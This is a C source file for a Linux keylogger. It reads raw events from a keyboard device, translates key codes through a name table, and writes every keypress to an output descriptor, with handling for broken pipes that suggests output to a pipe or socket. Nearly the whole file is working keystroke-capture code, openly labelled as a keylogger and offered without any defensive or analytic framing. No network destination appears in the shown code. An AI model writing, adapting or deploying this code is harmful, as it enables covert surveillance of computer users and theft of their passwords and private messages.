#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include "keylogger.h"

#define BUFFER_SIZE 100
#define NUM_KEYCODES 71

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

int loop = 1;

void sigint_handler(int sig){
    loop = 0;
}

/**
 * Ensures that the string pointed to by str is written to the file with file
 * descriptor file_desc.
 *
 * \returns 1 if writing completes succesfully, else 0
 */
int write_all(int file_desc, const char *str){
    int bytesWritten = 0;
    int bytesToWrite = strlen(str) + 1;

    do {
        bytesWritten = write(file_desc, str, bytesToWrite);

        if(bytesWritten == -1){
            return 0;
        }
        bytesToWrite -= bytesWritten;
        str += bytesWritten;
    } while(bytesToWrite > 0);

    return 1;
}


/**
 * Wrapper around write_all which exits safely if the write fails, without
 * the SIGPIPE terminating the program abruptly.
 */
void safe_write_all(int file_desc, const char *str, int keyboard){
    struct sigaction new_actn, old_actn;
    new_actn.sa_handler = SIG_IGN;
    sigemptyset(&new_actn.sa_mask);
    new_actn.sa_flags = 0;

    sigaction(SIGPIPE, &new_actn, &old_actn);

    if(!write_all(file_desc, str)){
        close(file_desc);
        close(keyboard);
        perror("\nwriting");
        exit(1);
    }

    sigaction(SIGPIPE, &old_actn, NULL);
}

void keylogger(int keyboard, int writeout){
    int eventSize = sizeof(struct input_event);
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int i;

    signal(SIGINT, sigint_handler);

    while(loop){
        bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);

        for(i = 0; i < (bytesRead / eventSize); ++i){
            if(events[i].type == EV_KEY){
                if(events[i].value == 1){
                    if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
                        safe_write_all(writeout, keycodes[events[i].code], keyboard);
                        safe_write_all(writeout, "\n", keyboard);
                    }
                    else{
                        write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                    }
                }
            }
        }
    }
    if(bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
}
